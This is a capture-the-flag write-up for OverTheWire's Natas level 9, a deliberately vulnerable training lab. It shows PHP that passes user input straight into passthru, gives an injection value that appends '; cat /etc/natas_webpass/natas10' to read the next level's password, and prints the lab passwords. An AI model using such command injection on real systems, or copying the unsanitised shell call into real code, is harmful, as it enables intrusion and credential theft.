# Write up

To login in the domain `http://natas9.natas.labs.overthewire.org/` use credentials:

Username: `natas9`<br/>
Password: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

When logging in, we can examine the code and we focus on the given PHP segment:

```php
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

According to the [documentation](https://www.php.net/manual/en/function.passthru.php):

> The `passthru()` function is similar to the `exec()` function in that it executes a command. This function should be used in place of `exec()` or `system()` when the output from the Unix command is binary data which needs to be passed directly back to the browser.

So if we manage to set the value of the variable `$key` to something like <br/>
`"asgasgn0ns3nsasgasgg" dictionary.txt ; cat /etc/natas_webpass/natas10; ls `<br/>
then the resulting function call would be <br/>
`passthru("grep -i "asgasgn0ns3nsasgasgg" dictionary.txt ; cat /etc/natas_webpass/natas10; ls dictionary.txt");`<br/>
which would yield us the password for level10.

The webpage has a form which controls the value of `$key` when a non-empty input is provided. Thus, by entering the above (`"asgasgn0ns3nsasgasgg" dictionary.txt ; cat /etc/natas_webpass/natas10; ls `) input, we are able to get the password for level10, which is `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

So to login in the level10 use the credentials:

Username: `natas10`<br/>
Password: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`
